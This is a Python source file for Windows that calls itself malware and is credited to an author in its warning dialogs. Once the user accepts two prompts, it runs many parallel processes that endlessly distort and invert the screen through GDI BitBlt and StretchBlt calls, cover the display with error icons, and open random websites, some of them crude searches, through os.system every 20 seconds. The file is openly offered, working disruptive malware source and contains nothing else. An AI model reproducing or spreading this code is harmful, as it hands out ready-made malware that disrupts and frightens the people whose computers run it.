from tkinter.messagebox import Message
import jpype
import jpype.imports
from time import time
from turtle import width
from win32api import *
from win32gui import *
from win32ui import * 
import ctypes
from ctypes import * 
import rotatescreen
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
import random
import time
import sys 
import numba
import numpy as np
import multiprocessing
import math
import win32con 
import win32gui
import win32api
import win32process

def running():



    if MessageBox("The software you just executed is considered malware. If you dont know what a  malware is,press simply No and nothing will happen. ", "FD20", MB_YESNO | MB_ICONWARNING) == 7:
      sys.exit()
    if MessageBox("The creator Frank South 20 is not responsible for any damages made using this malware, still execute it?", "FD20", MB_YESNO | MB_ICONWARNING) == 7:
      sys.exit()
	
    else:
        main()


class Data: 
    	sites = (
     "https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2F4kwgby1175a41.jpg&rdt=57032",
     "https://th.bing.com/th/id/R.d23a2cf5d029c36191a50ed087aeb932?rik=otugqROJg%2fxevA&pid=ImgRaw&r=0",
     "http://google.co.ck/search?q=daewoo+matiz",
     "https://freches.neocities.org",
     "https://headshot.monster/CCOCZW",
     "https://www.cdc.gov/museum/timeline/images/sarscov2-illus-600x315px.jpg?_=35682",
     "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
     "https://th.bing.com/th/id/OIP.27kNxWa8Z1Ze6FQCcpX6rQAAAA?pid=ImgDet&w=350&h=340&rs=1",
     "https://smartsleepingtips.com/wp-content/uploads/2020/04/cat-biting-persons-hand.jpg",
     "https://google.com/search?q=rats+when+they+see+a+kfc+deep+fryer",
	 "https://www.preventivevet.com/hs-fs/hubfs/Vet%20Video%20Resources/cat-bite-in-pain.jpg?width=3696&name=cat-bite-in-pain.jpg",
	 "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
     "https://grace-ah.com/images/tpb_03.jpg",
     "https://th.bing.com/th/id/OIP.YtmzSpV3d8Pk0TygVddtKQHaFj?pid=ImgDet&w=1024&h=768&rs=1",
     "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
     "https://github.com/Err01-Hub20",
     "https://www.youtube.com/@the-erro1",
     "http://google.co.ck/search?q=g3t+r3kt",
     "https://www.csoonline.com/wp-content/uploads/2023/06/cso_security_threat_virus_malicious_binary_code_bluebay2014_gettyimages-983223752_2400x1600-100801546-orig.jpg?quality=50&strip=all",
     "https://th.bing.com/th/id/R.6369552d0c6e56cae29e00c07e9e1753?rik=Ju8fNWV1WwV9wQ&riu=http%3a%2f%2fwww.patasepenas.com.br%2fwp-content%2fuploads%2f2017%2f06%2fCat-biting-finger_dreamstime_4375989-1000x641-e1497363840684.jpg&ehk=YfPnuBwm27bAArfwnd3s2OTi6jZrUK1zDHzHDDpRs2k%3d&risl=&pid=ImgRaw&r=0",
	 "https://github.com/Err01-Hub20/Elon_Musk_Virus/blob/main/01.png",
     "https://www.google.com/search?q=what+if+mom+is+gay&rlz=1C1AWFC_enSE1045SE1045&oq=what+if+mom+is+gay+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigATIKCAMQIRgWGB0YHtIBCDgwMzNqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8",
     "https://www.google.com/search?q=how+to+be+a+clown&rlz=1C1AWFC_enSE1045SE1045&oq=how+to+be+a+clo&gs_lcrp=EgZjaHJvbWUqBwgBEAAYgAQyBggAEEUYOTIHCAEQABiABDIICAIQABgWGB4yCAgDEAAYFhgeMggIBBAAGBYYHjIICAUQABgWGB4yCAgGEAAYFhgeMggIBxAAGBYYHjIICAgQABgWGB4yCAgJEAAYFhge0gEINjA2NmowajeoAgCwAgA&sourceid=chrome&ie=UTF-8",
     "https://www.google.com/search?q=how+to+poop+your+pants&rlz=1C1AWFC_enSE1045SE1045&oq=how+to+poop+your+pants+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIJCAEQABgTGIAEMgkIAhAAGBMYgAQyCQgDEAAYExiABDIJCAQQABgTGIAEMgkIBRAAGBMYgAQyCQgGEAAYExiABDIJCAcQABgTGIAEMgkICBAAGBMYgAQyCQgJEAAYExiABNIBCDY3MjVqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8",
     "https://www.google.com/search?sca_esv=587967043&rlz=1C1AWFC_enSE1045SE1045&q=cat+mouth&tbm=isch&source=lnms&sa=X&ved=2ahUKEwjAgentlviCAxWhQVUIHWa4BVQQ0pQJegQIChAB&biw=1280&bih=595&dpr=1.5",
     "https://github.com/Err01-Hub20/FrankSyd20-news.html", 
        )

IconWarning = LoadIcon(None, 32515)
IconError = LoadIcon(None, 32513)
 
def open_sites():
		global timeSubtract
		sites = Data.sites
		global time
		while True:
			Sleep(20000)
			__import__("os").system("start " + str(choice(sites)))
 

def error_drawing():
    global time
    global timeSubstract
  
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw,sh] = [user32.GetSystemMetrics(0),user32.GetSystemMetrics(1)] 
    hdc = GetDC(0)
    while True:
        DrawIcon(hdc, rd(sh), rd(sh), IconWarning)
        for i in range(60, 900):
            mouseX,mouseY = GetCursorPos()
            DrawIcon(hdc, mouseX, mouseY, IconError)
            Sleep(20)


def Mess(): 
        user32 = ctypes.windll.user32
        user32 = ctypes.windll.user32
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        hdc = GetDC(0) 
        x1 = rd(sw-100)
        y1 = rd(sw-700)
        x2 = rd(sw-400)
        y2 = rd(sw-400)

        width = rd(2200)
        height = rd(800)
        while True:
         BitBlt(hdc, x1 , y1, width , height , hdc, x2  , y2 , win32con.SRCCOPY)
         Sleep(20)
    
def screenmirror(): 
         user32 = ctypes.windll.user32
         user32.SetProcessDPIAware()
         [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
         hdc = GetDC(0) 
         x1 = rd(sw-100)
         y1 = rd(sw-700)
         x2 = rd(sw-400)
         y2 = rd(sw-400)
       
         width = rd(2200)
         height = rd(80)
         while True:
          BitBlt(hdc, x1 , y1,  width , height , hdc, x2  , y2 , win32con.SRCCOPY)
          Sleep(10)




def Puzzle():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    sw, sh = (GetSystemMetrics(0), GetSystemMetrics(1)) 
    hdc = GetDC(0) 
    x1 = rd(sw-100)
    y1 = rd(sh-200)
    x2 = rd(sw-400)
    y2 = rd(sw-400)

    width = rd(600)
    height = rd(6000)
    while True:
       BitBlt(hdc, x1, y1, width -10, height -10, hdc, x2, y2, win32con.SRCCOPY)
       Sleep(10)
  
def SCR_Pu():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        hdc = GetDC(0) 
        x1 = rd(sw-100)
        y1 = rd(sw-700)
        x2 = rd(sw-400)
        y2 = rd(sw-400)
       
        width = rd(2200)
        height = rd(80)
        while True:
         BitBlt(hdc, x1 , y1,  width , height , hdc, x2  , y2 , win32con.SRCCOPY)
         Sleep(10)
      
def Pu():
   
        sw, sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        HDC = GetDC(0) 
        x1 = rd(sw-100)
        y1 = rd(sw-700)
        x2 = rd(sw-400)
        y2 = rd(sw-400)
       
        width = rd(2200)
        height = rd(80)
        while True:
         BitBlt(HDC, x1 , y1,  width , height , HDC, x2  , y2 , win32con.SRCCOPY)
         Sleep(10)

def blink_screen():
    user32 = ctypes.windll.user32 
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True: 
     hdc = win32gui.GetDC(0)
     x1 = rd(sw-700)
     y1 = rd(sw-400)
     x2 = rd(sw-700)
     y2 = rd(sw-400)

     width = rd(2200)
     height = rd(800)
     color = (random.randint(0, 220), random.randint(0, 220), random.randint(0, 220))
     brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
     win32gui.SelectObject(hdc, brush)
     BitBlt(hdc, x1 , y1, width , height , hdc, x2  , y2 , win32con.PATINVERT)
 
def destruct_hell():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True:
     hdc = win32gui.GetDC(0)
     x1 = rd(sw-700)
     y1 = rd(sw-400)
     x2 = rd(sw-700)
     y2 = rd(sw-400)

     width = rd(2200)
     height = rd(800)
     color = (random.randint(0, 220), random.randint(0, 20), random.randint(0, 220))
     brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
     win32gui.SelectObject(hdc, brush)
     win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)  
     win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -102,-130, win32con.SRCCOPY)
     win32gui.BitBlt(hdc, x1 , y1, width , height , hdc, x2  , y2 , win32con.PATINVERT)
     win32gui.StretchBlt(hdc, 4, -10, sw  -5, sh -50, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
 
def blackaway():
     user32 = ctypes.windll.user32
     user32.SetProcessDPIAware()
     [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
     while True:
       hdc = GetDC(0)
       dx = dy = 1
       angle = 0
       size = 1
       speed = 5

       win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SRCAND)
       dx = math.ceil(math.sin(angle) * size * 10)
       dy = math.ceil(math.cos(angle) * size * 10)
       angle += speed / 10
       if angle > math.pi :
          angle = math.pi * -1




def destruct():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True:
     hdc = win32gui.GetDC(0)

     color = (random.randint(0, 220), random.randint(0, 20), random.randint(0, 220))
     brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
     win32gui.SelectObject(hdc, brush)
     win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)  
     win32gui.StretchBlt(hdc, 40, 10, sw  -5, sh -50, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
     win32gui.StretchBlt(hdc, 4, 10, sw  -500, sh -5, hdc, 0, 0, sw, sh, win32con.SRCCOPY)

def errors():
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]


    x = y = 0
    while True:
     win32gui.DrawIcon(hdc, x , y , win32gui.LoadIcon(None, win32con.IDI_ERROR)) 
     x = x + 30
     if x >= w:
        y = y + 30
        x = 0
     if y >= h:
        x = y = 0

def screen_breaker():
    
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True:
     hdc = GetDC(0)
     color = (random.randint(0, 220), random.randint(0, 220), random.randint(0, 220))
     brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
     win32gui.SelectObject(hdc, brush)   
     win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT) 
     win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -20,-20, win32con.SRCCOPY)  
     win32gui.StretchBlt(hdc, 400, -10, sw  -5, sh -5, hdc, 0, 0, sw, sh, win32con.SRCCOPY)

def scr_hell():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True:
     hdc = win32gui.GetDC(0)
     color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
     brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
     win32gui.SelectObject(hdc, brush)
     win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)

def hell_destruction():
     user32 = ctypes.windll.user32
     user32.SetProcessDPIAware()
     [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
     while True:
       hdc = GetDC(0)
       color = (random.randint(0, 820), random.randint(0, 820), random.randint(0, 920))
       brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
       win32gui.SelectObject(hdc, brush)   
       win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT) 
       win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -20,-20, win32con.SRCCOPY)  
       win32gui.StretchBlt(hdc, -20, -10, sw  -50, sh -50, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
       win32gui.BitBlt(hdc, random.randint(-13, 30), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
       win32gui.BitBlt(hdc, random.randint(-100, 100), random.randint(-100, 100), sw, sh, hdc, 0, 0, win32con.SRCCOPY)


def tunnel():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True:
       hdc = GetDC(0)
       color = (random.randint(0, 220), random.randint(0, 220), random.randint(0, 220))
       brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
       win32gui.SelectObject(hdc, brush)   
       win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)    
       win32gui.StretchBlt(hdc, 40, -10, sw  -5, sh -50, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
 
def main():
    while True:
      
        blkw = multiprocessing.Process(target = blackaway)
        hds = multiprocessing.Process(target = hell_destruction)
        scrh = multiprocessing.Process(target = scr_hell)
        error = multiprocessing.Process(target = errors)
        scrb = multiprocessing.Process(target = screen_breaker)
        u = multiprocessing.Process(target = Pu)
        puz = multiprocessing.Process(target = Puzzle)
        opensite = multiprocessing.Process(target = open_sites)
        bl = multiprocessing.Process(target = blink_screen)
        drawing_thead = multiprocessing.Process(target = error_drawing)
        ms = multiprocessing.Process(target = Mess)
        SCR = multiprocessing.Process(target = SCR_Pu) 
        scrm = multiprocessing.Process(target = screenmirror)
        tun = multiprocessing.Process(target = tunnel)
        desth = multiprocessing.Process(target = destruct_hell)
        det = multiprocessing.Process(target = destruct)
 

        opensite.start()
        time.sleep(30)
        ms.start()
        time.sleep(3)
        SCR.start()
        u.start()
        puz.start()
        scrm.start()
        time.sleep(20)
        drawing_thead.start() 
        time.sleep(10)
        opensite.terminate()
        tun.start()
        time.sleep(15)
        tun.terminate()
        bl.start()
        time.sleep(13)
        bl.terminate()
        u.terminate()
        puz.terminate()
        ms.terminate()
        desth.start()
        time.sleep(11)
        desth.terminate()
        det.start()
        time.sleep(12)
        det.terminate()
        scrb.start()
        time.sleep(11)
        scrb.terminate()
        error.start()
        time.sleep(12)
        error.terminate()
        scrh.start()
        time.sleep(14)
        scrh.terminate()
        hds.start()
        time.sleep(12)
        hds.terminate()
        blkw.start()
        time.sleep(15)
        blkw.terminate()


if __name__ == "__main__":
        running()  


 











